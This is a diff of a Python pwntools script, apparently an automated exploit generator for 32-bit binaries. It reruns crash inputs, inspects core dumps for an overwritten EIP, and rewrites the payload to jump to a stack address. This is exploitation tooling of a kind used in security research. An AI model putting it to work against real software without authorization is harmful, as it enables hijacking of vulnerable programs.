@@ -1,8 +1,9 @@
 from pwn import *
-from utils import build_command
+from utils import build_command, interactive_gdb
 from exploit_utils import ENV_VARS
 import argparse
 import glob
+import tempfile
 
 
 def reproducer(crash_input: bytes, arg_config: argparse.Namespace) -> bool:
@@ -29,12 +30,15 @@ def reproducer(crash_input: bytes, arg_config: argparse.Namespace) -> bool:
     target_bin = arg_config.target
 
     command = build_command(arg_config, crash_input)
+    print(f'repr command: {command}')
+
 
     rep_proc = subprocess.Popen(
         command,
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE, 
         stderr=subprocess.PIPE, 
+        env={**os.environ, **ENV_VARS}
     )
 
     #sending the crash input from stdin to all targets
@@ -74,6 +78,7 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace) -> b
     target_bin = arg_config.target
 
     command = build_command(arg_config, crash_input)
+    print(f'root cause analysis command: {command}')
 
     crash_proc = subprocess.Popen(
         command,
@@ -84,12 +89,23 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace) -> b
     )
     
     #sending the crash input from stdin to all targets
+    # print(f'in root cause analysis, sending the input: {crash_input}')
     crash_proc.communicate(input=crash_input)
+
+    if crash_proc.returncode != -11:  #if the mutation did not cause a crash
+        logging.error('in root cause analysis, payload mutation did not cause a crash for some reason. Investigating...')
+        interactive_gdb(target_bin, ENV_VARS)
+        sys.exit(1)
+
+    core_files = glob.glob(f'/core_dumps/core.{arg_config.target}.*')
     core_path = f"/core_dumps/core.{target_bin}.{crash_proc.pid}"
 
+    if core_path not in core_files:
+        logging.error('in root cause analysis, previous crash did not cause a core dump')
+        sys.exit(1)
+    
     core = Corefile(core_path)
     eip = core.eip.to_bytes(4, byteorder='little')
-
 
     #if the value of the eip belongs to the crash input, it means it was overwritten by the crash input and the payload reached the return address
     if eip in crash_input:    
@@ -113,21 +129,28 @@ def crash_explorer(crash_input: bytes, arg_config: argparse.Namespace):
     core_path = core_files[-1]
 
     core = Corefile(core_path)
-
+    eip = core.eip.to_bytes(4, byteorder='little')
+    print(f'value of eip: {eip} ')
     for register in core.registers:
 
         reg_value = core.registers[register].to_bytes(4, byteorder='little')
 
         if reg_value in crash_input:
-            # print(f'{register} crashed with input bytes {reg_value}')
+            print(f'{register} crashed with input bytes {reg_value}')
 
             #strategy on picking valid addresses that will later align with the jump addr??????
-            target = b'\xd0\xd0\xff\xff'
+            stack_addr = (core.stack.start + core.stack.stop) // 2
+            stack_addr += 4
+            # print(f'stack base: {stack_base}, stack limit: {stack_limit}, stack middle: {hex(middle)}')
+            # target = b'\xd0\xd0\xff\xff'
+            target = struct.pack("<I", stack_addr)
+            print(f'target: {target}')
 
             payload_mutation = crash_input.replace(reg_value, target)
             # print(f'payload mutation {payload_mutation}')
 
 
+    print(f'payload mutation {payload_mutation}')
     return payload_mutation
 
 
